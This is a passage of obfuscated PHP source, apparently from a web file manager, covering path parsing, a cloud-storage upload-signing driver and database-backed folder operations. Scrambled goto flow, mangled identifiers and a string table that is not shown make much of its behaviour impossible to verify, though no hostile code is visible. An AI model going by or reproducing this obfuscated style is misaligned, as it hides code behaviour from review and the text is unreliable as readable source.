"\x6d\157\x64\151\146\x79\124\151\x6d\145", $AºÕÙ¦ôÈù = false) { $e‰š¬è³Âæ = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$e‰š¬è³Âæ) { return $bà‰šÔ÷Ç ? null : array(); } if (!$bà‰šÔ÷Ç) { $e‰š¬è³Âæ = array_filter(array_values($e‰š¬è³Âæ)); return array_sort_by($e‰š¬è³Âæ, $FŠºØÙóÏ, $AºÕÙ¦ôÈù); } return $e‰š¬è³Âæ[$_SERVER[£¶ä½¶¢][398] . $bà‰šÔ÷Ç]; } public function insert($Eñá±¸¨•ô) { goto Eí—Ú´°œ‘; cÆĞõ £ÃÎ: $Eñá±¸¨•ô[$C•¾Áêöõ[94]] = time(); Model($this->modelType)->set($C•¾Áêöõ[399], $D†À±ÛÆÏÓ, $this->optionType . $C•¾Áêöõ[400]); Model($this->modelType)->set($C•¾Áêöõ[398] . $D†À±ÛÆÏÓ, $Eñá±¸¨•ô, $this->optionType); goto b»Ï±Ÿ¾¨; b»Ï±Ÿ¾¨: return $D†À±ÛÆÏÓ; goto DÅÛ˜áÒ›·; D÷Á™Ã­¹œ: $D†À±ÛÆÏÓ = $D†À±ÛÆÏÓ ? $D†À±ÛÆÏÓ : 0; $Eñá±¸¨•ô[$C•¾Áêöõ[401]] = ++$D†À±ÛÆÏÓ; $Eñá±¸¨•ô[$C•¾Áêöõ[204]] = time(); goto cÆĞõ £ÃÎ; Eí—Ú´°œ‘: $C•¾Áêöõ =& $_SERVER[£¶ä½¶¢]; $Eñá±¸¨•ô = array_field_key($Eñá±¸¨•ô, $this->field); $D†À±ÛÆÏÓ = Model($this->modelType)->get($C•¾Áêöõ[399], $this->optionType . $C•¾Áêöõ[400]); goto D÷Á™Ã­¹œ; DÅÛ˜áÒ›·: } public function update($eßóÈ…Æª¿, $aíŒ­Ç¦¯Ó) { goto dí£š¼µ; dí£š¼µ: $Dãš‘¨Éš =& $_SERVER[£¶ä½¶¢]; $aíŒ­Ç¦¯Ó = array_field_key($aíŒ­Ç¦¯Ó, $this->field); $F²â¦ñÜ« = $this->listData($eßóÈ…Æª¿); goto Cíƒ’äŞ’ª; Cíƒ’äŞ’ª: if (!$F²â¦ñÜ«) { return !1; } $aíŒ­Ç¦¯Ó = array_merge($F²â¦ñÜ«, $aíŒ­Ç¦¯Ó); $aíŒ­Ç¦¯Ó[$Dãš‘¨Éš[94]] = time(); goto c†Ó¼ µ±ô; c†Ó¼ µ±ô: return Model($this->modelType)->set($Dãš‘¨Éš[398] . $eßóÈ…Æª¿, $aíŒ­Ç¦¯Ó, $this->optionType); goto f¸‘¹ÆĞ»¯; f¸‘¹ÆĞ»¯: } public function remove($b‘âÅáÊŸ) { return Model($this->modelType)->remove($_SERVER[£¶ä½¶¢][398] . $b‘âÅáÊŸ, $this->optionType); } public function clear() { $FÍªÌÚôˆ© =& $_SERVER[£¶ä½¶¢]; Model($this->modelType)->remove($FÍªÌÚôˆ©[399], $this->optionType . $FÍªÌÚôˆ©[400]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($dÙ¿ÏóÂº, $F»ØšëëÑ´) { if (!$F»ØšëëÑ´) { return !1; } $a„—ĞŸ´ëÙ = $this->listData(); $a„—ĞŸ´ëÙ = array_to_keyvalue($a„—ĞŸ´ëÙ, $dÙ¿ÏóÂº); return isset($a„—ĞŸ´ëÙ[$F»ØšëëÑ´]) ? $a„—ĞŸ´ëÙ[$F»ØšëëÑ´] : !1; } public function findByName($b½Á‘‰»½) { return $this->findByKey($_SERVER[£¶ä½¶¢][38], $b½Á‘‰»½); } protected function resetData($b×£‰²ÇåŞ) { $e™Ûñ§Œ±À =& $_SERVER[£¶ä½¶¢]; $b×£‰²ÇåŞ = is_array($b×£‰²ÇåŞ) ? $b×£‰²ÇåŞ : array(); $aã‡˜ºÖƒŸ = array(); for ($b×Ê¦Ÿ†„¶ = 0; $b×Ê¦Ÿ†„¶ < count($b×£‰²ÇåŞ); $b×Ê¦Ÿ†„¶++) { $aã‡˜ºÖƒŸ[$e™Ûñ§Œ±À[398] . $b×£‰²ÇåŞ[$b×Ê¦Ÿ†„¶][$e™Ûñ§Œ±À[401]]] = $b×£‰²ÇåŞ[$b×Ê¦Ÿ†„¶]; } return Model($this->modelType)->set($aã‡˜ºÖƒŸ, !1, $this->optionType); } private function getAutoName($dÁ•ñŠ¥æ) { $C•õÖÕÜ¾ = array_to_keyvalue($this->listData(), $_SERVER[£¶ä½¶¢][38]); if (!$C•õÖÕÜ¾ || !isset($C•õÖÕÜ¾[$dÁ•ñŠ¥æ])) { return $dÁ•ñŠ¥æ; } for ($f¬øÆ®­“ = 1; $f¬øÆ®­“ < count($C•õÖÕÜ¾); $f¬øÆ®­“++) { $F”³¼Ã÷· = $dÁ•ñŠ¥æ . "\x28{$f¬øÆ®­“}\51"; if (!isset($C•õÖÕÜ¾[$F”³¼Ã÷·])) { return $F”³¼Ã÷·; } } return $F”³¼Ã÷·; } } goto aÊ³±¡²Åî; C¡œÌñµ’: class KodIO { const KOD_SOURCE = "\173\163\157\x75\162\143\145\175"; const KOD_USER_RECYCLE = "\x7b\x75\163\x65\x72\x52\145\143\x79\x63\154\x65\175"; const KOD_USER_FAV = "\173\x75\x73\145\162\x46\141\166\x7d"; const KOD_USER_FILE_TAG = "\173\x75\163\x65\162\x46\x69\154\145\124\x61\147\175"; const KOD_USER_FILE_TYPE = "\x7b\x75\163\145\x72\106\x69\154\145\124\x79\160\x65\175"; const KOD_GROUP_ROOT_SELF = "\x7b\x67\x72\157\165\x70\122\x6f\x6f\164\123\x65\x6c\146\175"; const KOD_USER_SHARE = "\x7b\x75\163\145\x72\x53\150\x61\x72\145\175"; const KOD_USER_SHARE_LINK = "\x7b\x75\163\145\162\x53\x68\x61\162\145\x4c\x69\156\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\173\163\x68\141\162\x65\124\x6f\115\145\x7d"; const KOD_SHARE_ITEM = "\173\x73\150\141\162\145\111\164\145\x6d\x7d"; const KOD_SHARE_LINK = "\x7b\x73\x68\x61\162\145\x49\x74\145\155\x4c\x69\156\153\x7d"; const KOD_SEARCH = "\173\x73\x65\141\162\x63\x68\x7d"; const KOD_BLOCK = "\x7b\x62\154\x6f\x63\x6b\175"; const KOD_IO = "\173\151\157\175"; const KOD_USER_RECENT = "\173\x75\x73\145\162\x52\x65\156\x63\145\156\x74\175"; const KOD_USER_DRIVER = "\x7b\144\x72\x69\166\x65\x72\x7d"; public static function typeList() { $F¡ä«èƒ½² =& $_SERVER[£¶ä½¶¢]; return array($F¡ä«èƒ½²[1136] => self::KOD_SOURCE, $F¡ä«èƒ½²[1137] => self::KOD_USER_RECYCLE, $F¡ä«èƒ½²[1138] => self::KOD_USER_FAV, $F¡ä«èƒ½²[1139] => self::KOD_USER_FILE_TAG, $F¡ä«èƒ½²[1140] => self::KOD_USER_FILE_TYPE, $F¡ä«èƒ½²[1141] => self::KOD_GROUP_ROOT_SELF, $F¡ä«èƒ½²[1142] => self::KOD_USER_SHARE, $F¡ä«èƒ½²[1143] => self::KOD_USER_SHARE_LINK, $F¡ä«èƒ½²[1144] => self::KOD_USER_SHARE_TO_ME, $F¡ä«èƒ½²[1145] => self::KOD_SHARE_ITEM, $F¡ä«èƒ½²[1146] => self::KOD_SHARE_LINK, $F¡ä«èƒ½²[1147] => self::KOD_SEARCH, $F¡ä«èƒ½²[1148] => self::KOD_BLOCK, $F¡ä«èƒ½²[1149] => self::KOD_IO, $F¡ä«èƒ½²[1150] => self::KOD_USER_RECENT, $F¡ä«èƒ½²[1151] => self::KOD_USER_DRIVER); } public static function parse($FæŠŸâ³ŠÉ) { goto aËİ×­†›»; eœÃ°£Æ–: preg_match($d¶¥æñÏ®[1152], $FæŠŸâ³ŠÉ, $f¨™åÜğñ’); $c–öŠê«‚Ë = array($d¶¥æñÏ®[423] => !1, $d¶¥æñÏ®[1153] => !1, $d¶¥æñÏ®[420] => !1, $d¶¥æñÏ®[86] => $FæŠŸâ³ŠÉ, $d¶¥æñÏ®[1063] => !1, $d¶¥æñÏ®[1062] => $d¶¥æñÏ®[43]); if (is_array($f¨™åÜğñ’) && count($f¨™åÜğñ’) == 5) { $bëˆ»¯¸é = $d¶¥æñÏ®[1154] . $f¨™åÜğñ’[2] . $d¶¥æñÏ®[334]; if (in_array($bëˆ»¯¸é, $CëÄö©¦ê’)) { $c–öŠê«‚Ë[$d¶¥æñÏ®[1063]] = $f¨™åÜğñ’[1]; $c–öŠê«‚Ë[$d¶¥æñÏ®[39]] = $bëˆ»¯¸é; $c–öŠê«‚Ë[$d¶¥æñÏ®[1155]] = substr($bëˆ»¯¸é, 1, -1); $c–öŠê«‚Ë[$d¶¥æñÏ®[401]] = $f¨™åÜğñ’[3]; } $c–öŠê«‚Ë[$d¶¥æñÏ®[1062]] = $f¨™åÜğñ’[4]; } goto Dèö…Â°²; aËİ×­†›»: $d¶¥æñÏ® =& $_SERVER[£¶ä½¶¢]; $FæŠŸâ³ŠÉ = self::clear($FæŠŸâ³ŠÉ); $CëÄö©¦ê’ = array_values(self::typeList()); goto eœÃ°£Æ–; Dèö…Â°²: $AÍ¨çÑ¤ = array($d¶¥æñÏ®[43], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $c–öŠê«‚Ë[$d¶¥æñÏ®[1118]] = in_array($c–öŠê«‚Ë[$d¶¥æñÏ®[39]], $AÍ¨çÑ¤); return $c–öŠê«‚Ë; goto c¬³ÎøÆà; c¬³ÎøÆà: } public static function isTruePath($F‘ì˜ßô·˜) { goto CòŠ»÷¼°¼; D™ƒÅİŒÜ‡: if (strpos($F‘ì˜ßô·˜, $EÆæŒ¨Š“Ë[1121]) === 0) { return !0; } if (strpos($F‘ì˜ßô·˜, $EÆæŒ¨Š“Ë[1156]) === 0) { return !0; } if (strpos($F‘ì˜ßô·˜, $EÆæŒ¨Š“Ë[1157]) === 0) { return !0; } goto bµ‰ëÑÓë¹; bµ‰ëÑÓë¹: if (strpos($F‘ì˜ßô·˜, $EÆæŒ¨Š“Ë[1158]) === 0) { return !0; } return !1; goto dá¡ïĞ»‡; CòŠ»÷¼°¼: $EÆæŒ¨Š“Ë =& $_SERVER[£¶ä½¶¢]; if (substr($F‘ì˜ßô·˜, 0, 1) != $EÆæŒ¨Š“Ë[1154]) { return !0; } if (strpos($F‘ì˜ßô·˜, $EÆæŒ¨Š“Ë[409]) === 0) { return !0; } goto D™ƒÅİŒÜ‡; dá¡ïĞ»‡: } public static function clear($CÁĞÅÑ™¥Ÿ) { goto BÊ¸âö˜È; E‚ò¹–øå°: $CÔÊ¼ëŠ›É = $d¯»Ÿ¦ç‹ê[1159]; if (substr($CÁĞÅÑ™¥Ÿ, 0, 3) == $d¯»Ÿ¦ç‹ê[1160]) { $CÁĞÅÑ™¥Ÿ = substr($CÁĞÅÑ™¥Ÿ, 3); } while (strstr($CÁĞÅÑ™¥Ÿ, $CÔÊ¼ëŠ›É)) { $CÁĞÅÑ™¥Ÿ = str_replace($CÔÊ¼ëŠ›É, $d¯»Ÿ¦ç‹ê[18], $CÁĞÅÑ™¥Ÿ); } goto A»¯Œ„†Ûæ; F…ÂŸ¯ìà: return $CÁĞÅÑ™¥Ÿ; goto EÀ™…ƒ²àÏ; A»¯Œ„†Ûæ: $CÁĞÅÑ™¥Ÿ = preg_replace($d¯»Ÿ¦ç‹ê[1161], $d¯»Ÿ¦ç‹ê[18], $CÁĞÅÑ™¥Ÿ); if ($CÁĞÅÑ™¥Ÿ == $d¯»Ÿ¦ç‹ê[18]) { return $d¯»Ÿ¦ç‹ê[18]; } $CÁĞÅÑ™¥Ÿ = rtrim($CÁĞÅÑ™¥Ÿ, $d¯»Ÿ¦ç‹ê[18]); goto F…ÂŸ¯ìà; BÊ¸âö˜È: $d¯»Ÿ¦ç‹ê =& $_SERVER[£¶ä½¶¢]; $CÁĞÅÑ™¥Ÿ = str_replace(array($d¯»Ÿ¦ç‹ê[1036], $d¯»Ÿ¦ç‹ê[9]), $d¯»Ÿ¦ç‹ê[60], $CÁĞÅÑ™¥Ÿ); $CÁĞÅÑ™¥Ÿ = str_replace($d¯»Ÿ¦ç‹ê[107], $d¯»Ÿ¦ç‹ê[18], $CÁĞÅÑ™¥Ÿ); goto E‚ò¹–øå°; EÀ™…ƒ²àÏ: } public static function sourceID($bñ»ĞÜÅŸé) { $E‚¨³ğ”Üµ =& $_SERVER[£¶ä½¶¢]; $eœÛ‘À²Èˆ = self::parse($bñ»ĞÜÅŸé); if ($eœÛ‘À²Èˆ[$E‚¨³ğ”Üµ[39]] !== self::KOD_SOURCE) { show_json(LNG($E‚¨³ğ”Üµ[1162]), !1); } return $eœÛ‘À²Èˆ[$E‚¨³ğ”Üµ[401]]; } public static function make($cæ´‚êª´) { if (!$cæ´‚êª´) { return !1; } return self::makePath(self::KOD_SOURCE, intval($cæ´‚êª´)); } public static function makeShare($d Ğ©õéé¦, $CòÆ…÷‘‘‚) { return self::makePath(self::KOD_SHARE_ITEM, $d Ğ©õéé¦, $CòÆ…÷‘‘‚); } public static function makeFileTypePath($aµØ‘©’¨) { return self::makePath(self::KOD_USER_FILE_TYPE, $aµØ‘©’¨); } public static function makeFileTagPath($d“ãÒˆ†½š) { return self::makePath(self::KOD_USER_FILE_TAG, $d“ãÒˆ†½š); } public static function makePath($BñÆÙÒİ„‹, $C¯†–Œ‡Ö = '', $cˆÓ¡ÇÜÇ = '') { $F×ÏÖÜ®ìŠ =& $_SERVER[£¶ä½¶¢]; $bªà‰ƒêÃ = substr($BñÆÙÒİ„‹, 1, -1); $CµÉ–Şˆš = $F×ÏÖÜ®ìŠ[1163] . $bªà‰ƒêÃ . $F×ÏÖÜ®ìŠ[1164] . $C¯†–Œ‡Ö . $F×ÏÖÜ®ìŠ[1165]; $CµÉ–Şˆš = $cˆÓ¡ÇÜÇ ? $CµÉ–Şˆš . $cˆÓ¡ÇÜÇ . $F×ÏÖÜ®ìŠ[18] : $CµÉ–Şˆš; return $CµÉ–Şˆš; } public static function hashPath($b½àêªµÓŠ, $Eï‹ÈÓÚå‰ = true) { goto c´‹ÅĞ¹; bÒïÏÇ¼Á‡: return $bÔ§–Ú±Ç; goto Cà‘˜†ë¯ƒ; b­çŒ¢£Ÿ: if (!$bÔ§–Ú±Ç && isset($A·• ò²Î[$FÍ°Ù…òÆ™[403]])) { $A·• ò²Î = IO::info(KodIO::make($A·• ò²Î[$FÍ°Ù…òÆ™[403]])); $bÔ§–Ú±Ç = _get($A·• ò²Î, $FÍ°Ù…òÆ™[1166], $FÍ°Ù…òÆ™[43]); } if (!$bÔ§–Ú±Ç && $Eï‹ÈÓÚå‰) { $f„øÁ¯ƒíŞ = KodIO::parse($A·• ò²Î[$FÍ°Ù…òÆ™[86]]); if (!$f„øÁ¯ƒíŞ[$FÍ°Ù…òÆ™[39]]) { $bÔ§–Ú±Ç = IO::hashSimple($A·• ò²Î[$FÍ°Ù…òÆ™[86]]); } } if (!$bÔ§–Ú±Ç) { $bÔ§–Ú±Ç = md5($A·• ò²Î[$FÍ°Ù…òÆ™[86]] . $A·• ò²Î[$FÍ°Ù…òÆ™[88]] . $A·• ò²Î[$FÍ°Ù…òÆ™[94]]); } goto bÒïÏÇ¼Á‡; c´‹ÅĞ¹: $FÍ°Ù…òÆ™ =& $_SERVER[£¶ä½¶¢]; $A·• ò²Î = is_array($b½àêªµÓŠ) ? $b½àêªµÓŠ : IO::info($b½àêªµÓŠ); $bÔ§–Ú±Ç = _get($A·• ò²Î, $FÍ°Ù…òÆ™[1166], $FÍ°Ù…òÆ™[43]); goto b­çŒ¢£Ÿ; Cà‘˜†ë¯ƒ: } public static function initSystemPath() { goto eÁ•Ç‚äÉ¦; eÁ•Ç‚äÉ¦: $B¥Ìæö’É£ =& $_SERVER[£¶ä½¶¢]; if (defined($B¥Ìæö’É£[1167])) { return; } define($B¥Ìæö’É£[1167], self::systemPath($B¥Ìæö’É£[1168])); goto BŠ““Äİ¯ä; F—í¢ôÌå: IOHistory::bindEvent(); goto E¶ôø£¸òÅ; BŠ““Äİ¯ä: define($B¥Ìæö’É£[1169], self::systemPath($B¥Ìæö’É£[1170])); define($B¥Ìæö’É£[1171], self::systemPath($B¥Ìæö’É£[1172])); define($B¥Ìæö’É£[1173], self::systemPath($B¥Ìæö’É£[1174])); goto F—í¢ôÌå; E¶ôø£¸òÅ: } public static function systemPath($A²ˆÙÑÅ‚) { goto dÒ¡ŒÇø™’; dÒ¡ŒÇø™’: $cŞÍöƒ„‰ =& $_SERVER[£¶ä½¶¢]; $AÆì£Ş­Ğ¾ = $cŞÍöƒ„‰[1175] . ucfirst($A²ˆÙÑÅ‚); $E¥àÔ„Ğ¦ = Model($cŞÍöƒ„‰[738])->get($AÆì£Ş­Ğ¾); goto d·ÑÔÛ¼ù‹; c¿ÍŠæîÂ: return $E¥àÔ„Ğ¦; goto C„¥¡¦ò¤; d·ÑÔÛ¼ù‹: if ($E¥àÔ„Ğ¦) { return $E¥àÔ„Ğ¦; } if ($A²ˆÙÑÅ‚ == $cŞÍöƒ„‰[1168]) { $E¥àÔ„Ğ¦ = self::make(Model($cŞÍöƒ„‰[798])->systemRootPathAdd($cŞÍöƒ„‰[513])); } else { $E¥àÔ„Ğ¦ = self::systemPath($cŞÍöƒ„‰[1168]); $EÔÏ•÷„° = self::sourceID($E¥àÔ„Ğ¦); $E¥àÔ„Ğ¦ = self::make(Model($cŞÍöƒ„‰[798])->mkdir($EÔÏ•÷„°, $A²ˆÙÑÅ‚)); } Model($cŞÍöƒ„‰[738])->set($AÆì£Ş­Ğ¾, $E¥àÔ„Ğ¦); goto c¿ÍŠæîÂ; C„¥¡¦ò¤: } public static function systemFolder($få¨«İ¬½) { $AÒÊáôôëˆ = IO_PATH_SYSTEM_SOURCE . $få¨«İ¬½; $D´ƒçÓÇİé = Cache::get($AÒÊáôôëˆ); if (!$D´ƒçÓÇİé) { $aïšŒ‘æÆ‡ = IO::infoFull($AÒÊáôôëˆ); if (!$aïšŒ‘æÆ‡) { $D´ƒçÓÇİé = IO::mkdir($AÒÊáôôëˆ, REPEAT_SKIP); } else { $D´ƒçÓÇİé = $aïšŒ‘æÆ‡[$_SERVER[£¶ä½¶¢][86]]; } Cache::set($AÒÊáôôëˆ, $D´ƒçÓÇİé, 3600 * 10); } return $D´ƒçÓÇİé; } public static function defaultDriver() { return Model($_SERVER[£¶ä½¶¢][735])->defaultDriver(); } public static function defaultIO() { $b•É§·»—… =& $_SERVER[£¶ä½¶¢]; $cé¢ÙÃáíê = self::defaultDriver(); return $b•É§·»—…[1176] . $cé¢ÙÃáíê[$b•É§·»—…[401]] . $b•É§·»—…[1165]; } public static function defaultDriverInit() { static $eµ¥Ğİ›® = false; if ($eµ¥Ğİ›®) { return $eµ¥Ğİ›®; } $eµ¥Ğİ›® = IO::init(self::defaultIO()); return $eµ¥Ğİ›®; } public static function fileTypeList() { $f…¦§ô‰²¿ =& $_SERVER[£¶ä½¶¢]; $AÈ½´”Åà™ = $GLOBALS[$f…¦§ô‰²¿[16]][$f…¦§ô‰²¿[1177]]; foreach ($AÈ½´”Åà™ as $A„çÄ§­…† => $b·éëéÆ…) { $BäÔ£ñô¶ô = $f…¦§ô‰²¿[1178] . $A„çÄ§­…†; $döÑÏ£š…æ = LNG($BäÔ£ñô¶ô); if ($BäÔ£ñô¶ô != $döÑÏ£š…æ) { $AÈ½´”Åà™[$A„çÄ§­…†][$f…¦§ô‰²¿[38]] = $döÑÏ£š…æ; } } return $AÈ½´”Åà™; } public static function transferType($fºÊ ‡¹¤ô, $dé”¢…¾µå) { goto då‰ˆï¨Æ; bÔ¬Ÿõ²: return $C·´¹ùµÄ[1181]; goto B“õ«…ÎîÕ; då‰ˆï¨Æ: $C·´¹ùµÄ =& $_SERVER[£¶ä½¶¢]; $cÍ±ÆÂÏ°¶ = self::driverType($fºÊ ‡¹¤ô); $fÜ—Ã¤Ñ» = self::driverType($dé”¢…¾µå); goto Bˆ„ƒêÌÛ; Bˆ„ƒêÌÛ: if ($cÍ±ÆÂÏ°¶[$C·´¹ùµÄ[39]] == $fÜ—Ã¤Ñ»[$C·´¹ùµÄ[39]] && $cÍ±ÆÂÏ°¶[$C·´¹ùµÄ[1179]] == $fÜ—Ã¤Ñ»[$C·´¹ùµÄ[1179]]) { return $C·´¹ùµÄ[1180]; } if ($cÍ±ÆÂÏ°¶[$C·´¹ùµÄ[39]] == $C·´¹ùµÄ[831] && $fÜ—Ã¤Ñ»[$C·´¹ùµÄ[39]] == $C·´¹ùµÄ[116]) { return $C·´¹ùµÄ[1092]; } if ($cÍ±ÆÂÏ°¶[$C·´¹ùµÄ[39]] == $C·´¹ùµÄ[116] && $fÜ—Ã¤Ñ»[$C·´¹ùµÄ[39]] == $C·´¹ùµÄ[831]) { return $C·´¹ùµÄ[117]; } goto bÔ¬Ÿõ²; B“õ«…ÎîÕ: } public static function driverType($cğÙ‚Î‚ƒÄ) { goto aÑ…ğŒÏ; f©‘Ä¨ô´Ş: if ($b””âŠ„àæ == $C÷İâÏ÷•Ø[726] || $b””âŠ„àæ == $C÷İâÏ÷•Ø[1183] || $b””âŠ„àæ == $C÷İâÏ÷•Ø[1184]) { $cğÙ‚Î‚ƒÄ = self::defaultDriverInit(); } else { if ($b””âŠ„àæ == $C÷İâÏ÷•Ø[1099] || $b””âŠ„àæ == $C÷İâÏ÷•Ø[1185]) { $cğÙ‚Î‚ƒÄ = IO::init($cğÙ‚Î‚ƒÄ->pathParse[$C÷İâÏ÷•Ø[1046]]); } } $b””âŠ„àæ = str_replace($C÷İâÏ÷•Ø[1182], $C÷İâÏ÷•Ø[43], strtolower($cğÙ‚Î‚ƒÄ->getType())); if ($b””âŠ„àæ == $C÷İâÏ÷•Ø[116]) { return array($C÷İâÏ÷•Ø[39] => $C÷İâÏ÷•Ø[116], $C÷İâÏ÷•Ø[1179] => $C÷İâÏ÷•Ø[43], $C÷İâÏ÷•Ø[86] => $bÇ…Á«ö‹º); } goto DøßÈóš”º; DøßÈóš”º: return array($C÷İâÏ÷•Ø[39] => $C÷İâÏ÷•Ø[831], $C÷İâÏ÷•Ø[1179] => $cğÙ‚Î‚ƒÄ->pathDriver, $C÷İâÏ÷•Ø[86] => $bÇ…Á«ö‹º); goto d£í…¶òâ; aÑ…ğŒÏ: $C÷İâÏ÷•Ø =& $_SERVER[£¶ä½¶¢]; $bÇ…Á«ö‹º = $cğÙ‚Î‚ƒÄ->path; $b””âŠ„àæ = str_replace($C÷İâÏ÷•Ø[1182], $C÷İâÏ÷•Ø[43], strtolower($cğÙ‚Î‚ƒÄ->getType())); goto f©‘Ä¨ô´Ş; d£í…¶òâ: } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($Aã¹¥ŒéØÀ) { parent::__construct($Aã¹¥ŒéØÀ); $this->signatureVersion($_SERVER[£¶ä½¶¢][222]); } public function uploadFormData($DÂÆ‹Ú£Í·, $f­ÊÕƒÖçÙ = 3600) { goto AŞß¯¿è›§; dÓçß±í: $d¸ëÓÎë× = sha1($b¯ó­‚¸ó); $CôñˆÁäõ“ = hash_hmac($eŠÚÃÉÑÑ‚[239], $d¸ëÓÎë×, $f¨¿Ô‘Æ£); $Bæ†’Ã‡Ä = array($eŠÚÃÉÑÑ‚[1190] => $E¾ ìŒ›…, $eŠÚÃÉÑÑ‚[1194] => $DÎ‘‘°Ü¥‹, $eŠÚÃÉÑÑ‚[1198] => base64_encode($b¯ó­‚¸ó), $eŠÚÃÉÑÑ‚[1195] => $e•ğ£¹’¼•, $eŠÚÃÉÑÑ‚[1196] => $this->accessKey, $eŠÚÃÉÑÑ‚[1199] => $f… æŠİë, $eŠÚÃÉÑÑ‚[1200] => $CôñˆÁäõ“, $eŠÚÃÉÑÑ‚[185] => $this->getHost()); goto eÍ‰Ã„°Œ©; eÍ‰Ã„°Œ©: return $Bæ†’Ã‡Ä; goto CõÀîÁ„ƒ¯; AŞß¯¿è›§: $eŠÚÃÉÑÑ‚ =& $_SERVER[£¶ä½¶¢]; $E¾ ìŒ›… = $eŠÚÃÉÑÑ‚[202]; $e•ğ£¹’¼• = $eŠÚÃÉÑÑ‚[239]; goto cø¤âø¬‡©; cø¤âø¬‡©: $DÎ‘‘°Ü¥‹ = $eŠÚÃÉÑÑ‚[1186]; $eì»¬é°ñº = gmdate($eŠÚÃÉÑÑ‚[1187], time() + $f­ÊÕƒÖçÙ); $f… æŠİë = (string) time() . $eŠÚÃÉÑÑ‚[78] . (string) (time() + $f­ÊÕƒÖçÙ); goto cã¦Â†å´‰; cã¦Â†å´‰: $b¯ó­‚¸ó = array($eŠÚÃÉÑÑ‚[1188] => $eì»¬é°ñº, $eŠÚÃÉÑÑ‚[1189] => array(array($eŠÚÃÉÑÑ‚[1190] => $E¾ ìŒ›…), array($eŠÚÃÉÑÑ‚[1191] => $this->bucket), array($eŠÚÃÉÑÑ‚[1192], $eŠÚÃÉÑÑ‚[1193], $eŠÚÃÉÑÑ‚[43]), array($eŠÚÃÉÑÑ‚[1194] => $DÎ‘‘°Ü¥‹), array($eŠÚÃÉÑÑ‚[1195] => $e•ğ£¹’¼•), array($eŠÚÃÉÑÑ‚[1196] => $this->accessKey), array($eŠÚÃÉÑÑ‚[1197] => $f… æŠİë))); $b¯ó­‚¸ó = json_encode($b¯ó­‚¸ó); $f¨¿Ô‘Æ£ = hash_hmac($eŠÚÃÉÑÑ‚[239], $f… æŠİë, $this->secret); goto dÓçß±í; CõÀîÁ„ƒ¯: } public function fileOutLink($f µ°¾Œ‘¡) { $C·…èì¤±Ÿ =& $_SERVER[£¶ä½¶¢]; if (substr($f µ°¾Œ‘¡, 0, 7) == $C·…èì¤±Ÿ[1201]) { $f µ°¾Œ‘¡ = $C·…èì¤±Ÿ[1202] . substr($f µ°¾Œ‘¡, 7); } header($C·…èì¤±Ÿ[169] . $f µ°¾Œ‘¡); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($AµÈß–ê·‚) { $this->pathParse = $AµÈß–ê·‚; $this->model = Model($_SERVER[£¶ä½¶¢][1203]); } public function getPath($c‚—™“ÒÚ) { return trim($c‚—™“ÒÚ, $_SERVER[£¶ä½¶¢][18]); } public function pathFather($fçğ¶Š¯ç°) { $Föİ±‹Å¬ = $this->parse($fçğ¶Š¯ç°); $Föİ±‹Å¬ = $this->infoSimple($fçğ¶Š¯ç°); return $Föİ±‹Å¬ ? $Föİ±‹Å¬[$_SERVER[£¶ä½¶¢][486]] : !1; } public function pathThis($EÇ‹×±è”) { $AÒÇ“ÙŞŞº = $this->infoSimple($EÇ‹×±è”); return $AÒÇ“ÙŞŞº ? $AÒÇ“ÙŞŞº[$_SERVER[£¶ä½¶¢][38]] : !1; } public function getPathOuter($AÅßìÉºÃ®) { if (!$AÅßìÉºÃ®) { return $AÅßìÉºÃ®; } $d—èŒËÄ¥Ù = $this->parse($AÅßìÉºÃ®); return KodIO::make($d—èŒËÄ¥Ù[$_SERVER[£¶ä½¶¢][401]]); } public function copyFolderFromIO($Bğ•ğ•µè, $E¦…å–ôŠ†, $Eœ¡Ã‰°–ò, $bÃ¡½†ÊëŸ, $eØ¥¤¡îÚ¼) { $C¿”Ï‘å¶ = $this->model->copyFolderFromIO($Bğ•ğ•µè, $E¦…å–ôŠ†, $Eœ¡Ã‰°–ò, $bÃ¡½†ÊëŸ, $eØ¥¤¡îÚ¼); return KodIO::make($C¿”Ï‘å¶); } public function isParentOf($BË²ÀÛ»´, $bÁ¢ì‚©Æƒ) { return $this->model->isParentOf($BË²ÀÛ»´, $bÁ¢ì‚©Æƒ); } public function mkfile($DÀã¼«í‡, $b•­ÌÔÄ¹æ = '', $Böé÷ƒç°Ñ = REPEAT_RENAME) { $B¾æ…šİ¡Ü =& $_SERVER[£¶ä½¶¢]; $FËİØè¡ø— = $this->parse($DÀã¼«í‡); $DÀã¼«í‡ = $FËİØè¡ø—[$B¾æ…šİ¡Ü[401]]; for ($AœÚÃ¼’¨˜ = 0; $AœÚÃ¼’¨˜ < count($FËİØè¡ø—[$B¾æ…šİ¡Ü[1204]]); $AœÚÃ¼’¨˜++) { $aŞî´åºÌ— = $FËİØè¡ø—[$B¾æ…šİ¡Ü[1204]][$AœÚÃ¼’¨˜]; if ($AœÚÃ¼’¨˜ == count($FËİØè¡ø—[$B¾æ…šİ¡Ü[1204]]) - 1) { $DÀã¼«í‡ = $this->model->mkfile($DÀã¼«í‡, $aŞî´åºÌ—, $b•­ÌÔÄ¹æ, $Böé÷ƒç°Ñ); break; } $DÀã¼«í‡ = $this->model->mkdir($DÀã¼«í‡, $aŞî´åºÌ—, REPEAT_SKIP); } return $this->getPathOuter($DÀã¼«í‡); } public function mkdir($E÷£óŸ¤È, $ağÈÓ£¨ = REPEAT_SKIP) { $BªÌ† íßÂ =& $_SERVER[£¶ä½¶¢]; $d“¨ÉîÊÍ = $this->parse($E÷£óŸ¤È); $E÷£óŸ¤È = $d“¨ÉîÊÍ[$BªÌ† íßÂ[401]]; for ($b›¾Ç¬õğÕ = 0; $b›¾Ç¬õğÕ < count($d“¨ÉîÊÍ[$BªÌ† íßÂ[1204]]); $b›¾Ç¬õğÕ++) { $DÊÊšöŠ‹ = $d“¨ÉîÊÍ[$BªÌ† íßÂ[1204]][$b›¾Ç¬õğÕ]; $E÷£óŸ¤È = $this->model->mkdir($E÷£óŸ¤È, $DÊÊšöŠ‹, $ağÈÓ£¨); } return $this->getPathOuter($E÷£óŸ¤È); } public function copyFile($C¯İ³Ş¯êœ, 